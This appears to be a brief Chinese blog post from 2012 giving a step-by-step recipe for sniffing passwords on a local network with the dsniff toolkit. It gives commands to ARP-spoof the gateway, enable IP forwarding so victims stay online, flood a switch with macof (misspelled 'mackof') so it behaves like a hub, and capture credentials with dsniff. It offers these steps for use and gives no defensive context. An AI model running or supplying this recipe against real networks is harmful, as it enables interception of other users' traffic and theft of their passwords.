---
layout: post
title: dsniff简单嗅探实战
date: 2012-03-13 23:02:49
categories: snippet
tags: dsniff
description: 

---
注意，下面的命令必须具有超级用户权限，特别地，打开内核转发必须在root用户下才有效。 

```
arpspoof 网关IP地址
``` 

作用，回复链路上的所有ARP查询包，将网关IP地址对应到本机的MAC上来，这样局域网内所有的数据包都会转发到本机上来。 注意，如果不想造成局域网断网的话，你需要打开Linux内核转发功能： 

```
echo "1" > /proc/sys/net/ipv4/ip_forward
``` 

还有一招比较阴险，使用macof导致交换机ARP缓存溢出，最终使交换机变成一个hub，不过注意，已经存在于交换机ARP缓存的条目不会被覆盖，只能等他们自然老化。 

```
mackof -i eth0
``` 

eth0是要泛洪的网络端口。 

最后嗅探密码: 
```
dsniff -cm
``` 

最近比较懒，写的字都很简略，抱歉…… 如果哪里有问题，欢迎指正；如果有什么不解，也欢迎和我交流:) 另外挂个链接备忘： [http://www.ibm.com/developerworks/cn/linux/security/l-ssniff/](http://www.ibm.com/developerworks/cn/linux/security/l-ssniff/)
